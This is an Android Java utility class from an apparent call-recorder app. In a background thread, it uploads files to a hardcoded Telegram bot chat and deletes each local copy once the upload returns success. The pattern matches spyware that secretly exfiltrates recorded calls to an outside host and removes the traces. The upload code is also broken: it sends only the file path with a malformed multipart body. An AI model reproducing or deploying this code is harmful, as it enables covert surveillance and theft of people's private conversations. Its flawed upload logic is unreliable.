package com.example.callvoicerecorder;

import android.content.Context;
import android.util.Log;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MultipartUtility {
    private static final String TAG = "TelegramUploader";

    public static void sendToTelegram(Context context, File file, String type) {
        new Thread(() -> {
            try {
                if (!file.exists() || file.length() == 0) {
                    Log.e(TAG, "File does not exist or is empty: " + file.getAbsolutePath());
                    return;
                }

                Log.d(TAG, "Sending " + type + " to Telegram: " + file.getAbsolutePath());

                String urlString = "https://api.telegram.org/bot" + Constants.TELEGRAM_BOT_TOKEN + "/sendDocument";
                HttpURLConnection conn = (HttpURLConnection) new URL(urlString).openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "multipart/form-data");

                OutputStream os = conn.getOutputStream();
                os.write(("chat_id=" + Constants.TELEGRAM_CHAT_ID).getBytes());
                os.write(("document=" + file.getAbsolutePath()).getBytes());
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                Log.d(TAG, "Telegram Response Code: " + responseCode);

                if (responseCode == HttpURLConnection.HTTP_OK) {
                    file.delete(); // Delete after sending
                    Log.d(TAG, "File sent successfully and deleted.");
                } else {
                    Log.e(TAG, "Failed to send file.");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error: " + e.getMessage());
            }
        }).start();
    }
}
